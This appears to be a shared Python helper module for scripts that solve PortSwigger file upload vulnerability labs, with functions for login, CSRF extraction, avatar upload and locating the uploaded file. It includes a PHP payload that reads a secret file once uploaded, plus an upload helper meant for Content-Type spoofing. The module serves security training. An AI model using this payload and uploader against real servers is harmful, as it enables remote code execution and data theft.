# file_upload_utils.py — shared utilities for File Upload Vulnerabilities
# lab automation scripts
#
# Mirrors all prior utils files in structure and naming conventions.
# Import in each lab script with:
#   from file_upload_utils import banner, section, make_session, ...

import re
import requests


def banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║     PortSwigger — File Upload Vulnerabilities Lab Suite      ║
║     Content-Type, Blacklist, Polyglot & Race Condition RCE   ║
╚══════════════════════════════════════════════════════════════╝
""")


def section(title):
    width = 64
    print(f"\n{'─' * width}")
    print(f"  {title}")
    print(f"{'─' * width}\n")


def make_session(proxies=None):
    """
    Return a requests.Session with TLS verification disabled and optional proxy.

    TLS verification is disabled because Burp Suite uses a self-signed
    certificate for its HTTPS interception proxy.
    """
    s = requests.Session()
    s.verify = False
    if proxies:
        s.proxies = proxies
    return s


def get_csrf_from_response(html):
    """
    Extract a CSRF token from an HTML page's hidden form input.
    Returns the token string or None if not found.
    """
    m = (re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\']([^"\']+)["\']', html) or
         re.search(r'name=["\']csrf["\'][^>]+value=["\']([^"\']+)["\']', html))
    return m.group(1) if m else None


def login(session, base_url, username="wiener", password="peter"):
    """
    Log in to the PortSwigger lab with the provided credentials.
    Returns True on success, False on failure.
    """
    login_page = session.get(f"{base_url}/login")
    csrf = get_csrf_from_response(login_page.text)

    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf

    r = session.post(f"{base_url}/login", data=data, allow_redirects=True)

    if "Log out" in r.text or "My account" in r.text:
        print(f"  ✔  Logged in as {username}")
        return True

    print(f"  ✘  Login failed for {username} (status {r.status_code})")
    return False


PHP_PAYLOAD = "<?php echo file_get_contents('/home/carlos/secret'); ?>"


def upload_avatar(session, base_url, filename, file_content, content_type="image/jpeg"):
    """
    Upload a file as the account avatar, mimicking the multipart/form-data
    request used across every lab in this module.

    filename: the name to send in the multipart Content-Disposition header
    file_content: bytes (or str, auto-encoded) to send as the file body
    content_type: the Content-Type to declare for the uploaded file part
                  (this is exactly the client-controlled value exploited
                  in Lab 02 — override it freely for testing)

    Returns the response object.
    """
    if isinstance(file_content, str):
        file_content = file_content.encode()

    account_page = session.get(f"{base_url}/my-account")
    csrf = get_csrf_from_response(account_page.text)

    files = {"avatar": (filename, file_content, content_type)}
    data = {}
    if csrf:
        data["csrf"] = csrf

    return session.post(f"{base_url}/my-account/avatar", files=files, data=data)


def find_avatar_url(session, base_url):
    """
    Fetch the account page and try to extract the URL the uploaded
    avatar is served from (typically /files/avatars/<filename>).
    Returns the path, or None if not found.
    """
    r = session.get(f"{base_url}/my-account")
    m = re.search(r'src=["\']?(/files/avatars/[^"\'>\s]+)', r.text)
    return m.group(1) if m else None


def check_status(response, expected, label="Request"):
    """
    Compare response.status_code against an expected value (int or list of
    ints) and print a pass/fail line.
    """
    expected_list = expected if isinstance(expected, (list, tuple)) else [expected]
    if response.status_code in expected_list:
        print(f"  ✔  {label} → status {response.status_code} (as expected)")
        return True
    print(f"  ✘  {label} → status {response.status_code} (expected {expected_list})")
    return False


def print_step(msg):
    """Print a single instructional step."""
    print(f"  ➜  {msg}")


def print_box(title, content):
    """
    Print a clearly bordered block — used for showing leaked secrets or
    exploit details.
    """
    bar = "─" * 60
    print(f"\n  ┌─── {title} {bar[:max(0, 52 - len(title))]}┐")
    for line in str(content).strip().split("\n"):
        print(f"  │  {line}")
    print(f"  └{bar}┘\n")
